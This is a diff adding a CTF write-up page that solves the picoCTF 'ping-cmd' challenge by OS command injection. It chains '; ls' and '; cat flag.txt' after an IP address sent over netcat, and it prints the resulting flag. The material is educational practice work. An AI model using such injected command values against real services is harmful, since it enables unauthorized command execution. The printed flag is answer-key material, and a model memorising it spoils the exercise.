@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF ping-cmd @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF General Skills Guide</h1>
+        <p>here's how to solve ping-cmd</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the General Skills Guides</a>
+            <hr>
+            <h2>ping-cmd</h2>
+            <pre>Name: ping-cmd
+Description: Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input? You can connect to the service here nc mysterious-sea.picoctf.net 64720
+Author: Yahaya Meddy
+Tags: Easy, General Skills, picoCTF 2026
+Challenge from: picoCTF 2026
+Hints:
+1. The program uses a shell command behind the scenes.
+2. Sometimes, You can run more than one command at a time.</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we have to make the server reveal its secrets by pinging DNS servers, like Google's DNS. The description also questions what would happen if we got "a little creative", so yeah, it's pretty obvious that this challenge is about input injection. But first we need to see how the NetCat works by entering, so we'll go onto the solution part.</p>
+            <h2>Solution</h2>
+            <p>If we enter the example IP we're told about we can see how the NetCat works:</p>
+            <pre>shukularuni@SHUKULAP:~$ nc mysterious-sea.picoctf.net 64720
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.55 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.52 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 9.515/9.534/9.554/0.019 ms
+^C</pre>
+            <p>What the challenge is doing is basically described by this command:</p>
+            <pre>ping -c 2 &lt;input&gt;</pre>
+            <p>And it prints the output of this command, the thing is that we can attach another command after that because it probably has no protection against input injection and it's just basic linux commands, so we can do this:</p>
+            <pre>ping -c 2 8.8.8.8; ls</pre>
+            <p>If we do that, it'll work normally and give the output to the ls command after ping, so let's check if that works here:</p>
+            <pre>shukularuni@SHUKULAP:~$ nc mysterious-sea.picoctf.net 64720
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.64 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.55 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 9.550/9.593/9.637/0.043 ms
+flag.txt
+script.sh
+^C</pre>
+            <p>So it does work. Now that we know the name of the file containing the flag, we can view it with cat:</p>
+            <pre>ping -c 2 8.8.8.8; cat flag.txt</pre>
+            <pre>shukularuni@SHUKULAP:~$ nc mysterious-sea.picoctf.net 64720
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.53 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.56 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 9.532/9.545/9.559/0.013 ms
+picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_b75fc848}^C</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/757">https://play.picoctf.org/practice/challenge/757</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
